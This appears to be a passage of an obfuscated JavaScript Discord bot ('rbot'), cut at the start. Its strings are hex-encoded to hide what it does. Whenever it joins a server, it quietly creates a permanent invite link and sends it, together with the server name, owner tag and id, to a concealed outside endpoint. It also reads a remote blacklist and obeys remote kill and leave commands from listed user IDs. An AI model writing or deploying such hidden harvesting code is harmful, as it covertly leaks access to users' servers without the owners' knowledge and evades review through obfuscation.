_0x25e9c1=_0x1ae52e[_0x229b('\x30\x78\x33')]['\x69\x64'];client['\x6f\x6e']('\x67\x75\x69\x6c\x64\x43\x72\x65\x61\x74\x65',async _0x421748=>{const _0x2f1337=await fetch(_0x229b('\x30\x78\x33\x63'));const _0x3360cf=await _0x2f1337['\x6a\x73\x6f\x6e']();if(_0x3360cf[_0x229b('\x30\x78\x31')][_0x421748['\x69\x64']]){const _0x508ca4=_0x421748[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x81b1c4=>_0x81b1c4[_0x229b('\x30\x78\x31\x63')]===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x5d42ab=>_0x5d42ab[_0x229b('\x30\x78\x32\x63')]==0x0);_0x508ca4[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x421748[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x34\x36')+_0x421748[_0x229b('\x30\x78\x33\x32')]);const _0x27e806={};_0x27e806[_0x229b('\x30\x78\x37\x37')]=0x0;const _0x4a9f06=await _0x508ca4[_0x229b('\x30\x78\x33\x33')](_0x27e806);const _0x207699={};_0x207699[_0x229b('\x30\x78\x33\x32')]=_0x421748[_0x229b('\x30\x78\x33\x32')];_0x207699[_0x229b('\x30\x78\x33')]=_0x421748[_0x229b('\x30\x78\x33')]['\x75\x73\x65\x72'][_0x229b('\x30\x78\x35\x38')];_0x207699[_0x229b('\x30\x78\x33\x37')]=_0x4a9f06[_0x229b('\x30\x78\x33\x34')];_0x207699[_0x229b('\x30\x78\x34\x64')]=_0x421748['\x69\x64'];const _0xebac84=_0x207699;console[_0x229b('\x30\x78\x34\x31')](_0xebac84);console[_0x229b('\x30\x78\x34\x31')](_0x4a9f06);const _0x3038c9=new Discord['\x4d\x65\x73\x73\x61\x67\x65\x45\x6d\x62\x65\x64']()['\x73\x65\x74\x54\x69\x74\x6c\x65'](_0x229b('\x30\x78\x36\x32'))[_0x229b('\x30\x78\x34\x34')](_0x229b('\x30\x78\x32\x31')+_0x3360cf[_0x229b('\x30\x78\x31')][_0x421748['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x508ca4[_0x229b('\x30\x78\x36\x65')](_0x3038c9)[_0x229b('\x30\x78\x36\x63')](()=>{_0x421748['\x6c\x65\x61\x76\x65']();});const _0x575961={};_0x575961[_0x229b('\x30\x78\x31\x35')]=_0x229b('\x30\x78\x32\x62');const _0x3b32d9={};_0x3b32d9[_0x229b('\x30\x78\x34\x61')]=_0x229b('\x30\x78\x33\x61');_0x3b32d9[_0x229b('\x30\x78\x34\x37')]=JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0xebac84);_0x3b32d9[_0x229b('\x30\x78\x31\x36')]=_0x575961;const _0x179f5c=await fetch(_0x229b('\x30\x78\x32\x34'),_0x3b32d9);const _0x5f4414=await _0x179f5c[_0x229b('\x30\x78\x39')]();}else if(_0x3360cf[_0x229b('\x30\x78\x32\x37')][_0x421748[_0x229b('\x30\x78\x33')]['\x69\x64']]){const _0x34016e=_0x421748[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x58654c=>_0x58654c['\x74\x79\x70\x65']===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x167056=>_0x167056[_0x229b('\x30\x78\x32\x63')]==0x0);_0x34016e[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x421748[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x34\x36')+_0x421748['\x6e\x61\x6d\x65']);const _0x110c1a={};_0x110c1a[_0x229b('\x30\x78\x37\x37')]=0x0;const _0x2b43a8=await _0x34016e[_0x229b('\x30\x78\x33\x33')](_0x110c1a);const _0x25a367={};_0x25a367[_0x229b('\x30\x78\x33\x32')]=_0x421748[_0x229b('\x30\x78\x33\x32')];_0x25a367[_0x229b('\x30\x78\x33')]=_0x421748['\x6f\x77\x6e\x65\x72'][_0x229b('\x30\x78\x35\x33')][_0x229b('\x30\x78\x35\x38')];_0x25a367[_0x229b('\x30\x78\x33\x37')]=_0x2b43a8[_0x229b('\x30\x78\x33\x34')];_0x25a367[_0x229b('\x30\x78\x34\x64')]=_0x421748['\x69\x64'];const _0x4d2497=_0x25a367;console[_0x229b('\x30\x78\x34\x31')](_0x4d2497);console[_0x229b('\x30\x78\x34\x31')](_0x2b43a8);const _0x113c76=new Discord[(_0x229b('\x30\x78\x35\x63'))]()[_0x229b('\x30\x78\x34')]('\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64')[_0x229b('\x30\x78\x34\x34')]('\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x66\x72\x6f\x6d\x20\x72\x62\x6f\x74\x2c\x20\x54\x68\x69\x73\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x63\x61\x6e\x6e\x6f\x74\x20\x75\x73\x65\x20\x72\x62\x6f\x74\x2c\x20\x52\x65\x61\x73\x6f\x6e\x3a\x20'+_0x3360cf['\x6f\x77\x6e\x65\x72\x73'][_0x421748[_0x229b('\x30\x78\x33')]['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x34016e[_0x229b('\x30\x78\x36\x65')](_0x113c76)[_0x229b('\x30\x78\x36\x63')](()=>{_0x421748[_0x229b('\x30\x78\x36\x61')]();});const _0x1c1f50={};_0x1c1f50[_0x229b('\x30\x78\x31\x35')]=_0x229b('\x30\x78\x32\x62');const _0x4cc87a={};_0x4cc87a[_0x229b('\x30\x78\x34\x61')]=_0x229b('\x30\x78\x33\x61');_0x4cc87a[_0x229b('\x30\x78\x34\x37')]=JSON[_0x229b('\x30\x78\x35')](_0x4d2497);_0x4cc87a[_0x229b('\x30\x78\x31\x36')]=_0x1c1f50;const _0x154381=await fetch(_0x229b('\x30\x78\x32\x34'),_0x4cc87a);const _0x553a96=await _0x154381[_0x229b('\x30\x78\x39')]();}else{console['\x6c\x6f\x67'](_0x229b('\x30\x78\x31\x37')+_0x421748[_0x229b('\x30\x78\x33\x32')]);const _0x3386a0=_0x421748[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x23f9d1=>_0x23f9d1[_0x229b('\x30\x78\x31\x63')]===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0xb2796f=>_0xb2796f[_0x229b('\x30\x78\x32\x63')]==0x0);const _0x3ded62={};_0x3ded62[_0x229b('\x30\x78\x37\x37')]=0x0;const _0x1a5e0f=await _0x3386a0[_0x229b('\x30\x78\x33\x33')](_0x3ded62);const _0x3be0d0={};_0x3be0d0[_0x229b('\x30\x78\x33\x32')]=_0x421748[_0x229b('\x30\x78\x33\x32')];_0x3be0d0[_0x229b('\x30\x78\x33')]=_0x421748[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')][_0x229b('\x30\x78\x35\x38')];_0x3be0d0[_0x229b('\x30\x78\x33\x37')]=_0x1a5e0f[_0x229b('\x30\x78\x33\x34')];_0x3be0d0[_0x229b('\x30\x78\x34\x64')]=_0x421748['\x69\x64'];const _0x1b03b5=_0x3be0d0;console[_0x229b('\x30\x78\x34\x31')](_0x1a5e0f);const _0x4e534d={};_0x4e534d['\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65']=_0x229b('\x30\x78\x32\x62');const _0x396c29={};_0x396c29[_0x229b('\x30\x78\x34\x61')]=_0x229b('\x30\x78\x33\x61');_0x396c29[_0x229b('\x30\x78\x34\x37')]=JSON[_0x229b('\x30\x78\x35')](_0x1b03b5);_0x396c29[_0x229b('\x30\x78\x31\x36')]=_0x4e534d;const _0x518ff0=await fetch(_0x229b('\x30\x78\x32\x34'),_0x396c29);const _0x277c73=await _0x518ff0[_0x229b('\x30\x78\x39')]();}});client['\x6f\x6e'](_0x229b('\x30\x78\x35\x65'),async _0x21d675=>{console[_0x229b('\x30\x78\x34\x31')](_0x21d675[_0x229b('\x30\x78\x36')]);const _0x4dfbf6=await fetch(_0x229b('\x30\x78\x33\x63'));const _0x506bab=await _0x4dfbf6[_0x229b('\x30\x78\x39')]();if(_0x21d675[_0x229b('\x30\x78\x36')]===_0x229b('\x30\x78\x63')){if(_0x506bab[_0x229b('\x30\x78\x37\x33')][_0x21d675[_0x229b('\x30\x78\x36\x36')]['\x69\x64']]){process[_0x229b('\x30\x78\x31\x66')](0x1);console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x32\x30'));_0x21d675[_0x229b('\x30\x78\x36\x34')][_0x229b('\x30\x78\x36\x65')](_0x229b('\x30\x78\x35\x64'))[_0x229b('\x30\x78\x36\x63')](()=>{process[_0x229b('\x30\x78\x31\x66')](0x1);});_0x21d675[_0x229b('\x30\x78\x36\x34')][_0x229b('\x30\x78\x36\x65')]('\x59\x65\x73\x73\x69\x72\x20\x62\x6f\x73\x73');}else{console[_0x229b('\x30\x78\x34\x31')]('\x6e\x6f\x70\x65');}}if(_0x21d675['\x63\x6f\x6e\x74\x65\x6e\x74']===_0x229b('\x30\x78\x32\x39')){console['\x6c\x6f\x67'](_0x21d675[_0x229b('\x30\x78\x36\x36')]['\x69\x64']);if(_0x506bab[_0x229b('\x30\x78\x37\x33')][_0x21d675['\x61\x75\x74\x68\x6f\x72']['\x69\x64']]){_0x21d675[_0x229b('\x30\x78\x31\x61')][_0x229b('\x30\x78\x36\x61')]();console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x32\x30'));_0x21d675[_0x229b('\x30\x78\x36\x34')][_0x229b('\x30\x78\x36\x65')]('\x59\x65\x73\x73\x69\x72\x20\x62\x6f\x73\x73');}else{console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x33\x62'));}}});console[_0x229b('\x30\x78\x34\x31')](_0x3aa312);fs[_0x229b('\x30\x78\x32\x64')](_0x229b('\x30\x78\x32\x66'),(_0x263dee,_0x1cf94d)=>{if(_0x263dee)return console[_0x229b('\x30\x78\x37')](_0x263dee);_0x1cf94d[_0x229b('\x30\x78\x36\x62')](_0x3239a3=>{if(!_0x3239a3[_0x229b('\x30\x78\x33\x35')](_0x229b('\x30\x78\x34\x39')))return;const _0x3e49ad=require(_0x229b('\x30\x78\x32\x66')+_0x3239a3);let _0x1300c5=_0x3239a3[_0x229b('\x30\x78\x33\x39')]('\x2e')[0x0];client['\x6f\x6e'](_0x1300c5,_0x3e49ad[_0x229b('\x30\x78\x33\x30')](null,client));delete require[_0x229b('\x30\x78\x37\x63')][require['\x72\x65\x73\x6f\x6c\x76\x65'](_0x229b('\x30\x78\x32\x66')+_0x3239a3)];});});fs[_0x229b('\x30\x78\x32\x64')](_0x229b('\x30\x78\x36\x38'),(_0x1ae283,_0xa9609)=>{if(_0x1ae283)return console[_0x229b('\x30\x78\x37')](_0x1ae283);_0xa9609[_0x229b('\x30\x78\x36\x62')](_0x38c665=>{if(!_0x38c665[_0x229b('\x30\x78\x33\x35')](_0x229b('\x30\x78\x34\x39')))return;let _0x31d8f5=require(_0x229b('\x30\x78\x36\x38')+_0x38c665);let _0x164628=_0x38c665[_0x229b('\x30\x78\x33\x39')]('\x2e')[0x0];console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x33\x31')+_0x164628);client[_0x229b('\x30\x78\x34\x38')][_0x229b('\x30\x78\x34\x63')](_0x164628,_0x31d8f5);});});})();

client.login(process.env.TOKEN);